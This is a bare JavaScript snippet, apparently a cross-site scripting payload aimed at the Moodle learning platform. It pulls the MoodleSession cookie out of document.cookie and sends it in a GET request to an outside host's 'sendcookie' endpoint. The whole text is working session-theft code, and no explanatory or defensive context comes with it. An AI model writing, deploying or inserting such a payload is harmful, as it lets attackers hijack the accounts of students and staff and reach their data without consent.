var h = new XMLHttpRequest();
m = /MoodleSession=([a-z0-9]+)/.exec(document.cookie)[0];
u = "http://garson.rishe.co/api/sendcookie/?"+m
h.open( "GET",u , false );
h.send( null );
